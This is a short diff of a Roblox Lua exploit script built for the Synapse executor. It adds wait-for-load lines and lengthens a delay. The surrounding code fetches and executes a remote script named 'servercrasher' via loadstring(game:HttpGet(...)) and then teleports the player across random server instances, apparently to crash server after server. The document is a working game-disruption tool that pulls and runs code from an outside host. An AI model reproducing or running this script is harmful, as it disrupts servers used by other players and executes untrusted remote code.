@@ -1,5 +1,8 @@
 --game.CoreGui.RobloxPromptGui.promptOverlay.ErrorPrompt.MessageArea.ErrorFrame.ErrorMessage.Text = "AYOOO :Flushed:"
 
+if not game:IsLoaded() then game.Loaded:wait() end
+repeat wait() until game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents") and game.Players.LocalPlayer
+
 local Decision = "any" 
 local Player = game.Players.LocalPlayer
 local GUIDs = {}
@@ -32,7 +35,7 @@ if syn.queue_on_teleport then
 loadstring(game:HttpGet("https://raw.githubusercontent.com/0nly6Ex/servercrasher/main/master.lua"))()
 
 
-    wait(40)
+    wait(80)
          if Decision == "any" then
                     game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, GUIDs[math.random(1,#GUIDs)].id, Player)
                 elseif Decision == "smallest" then
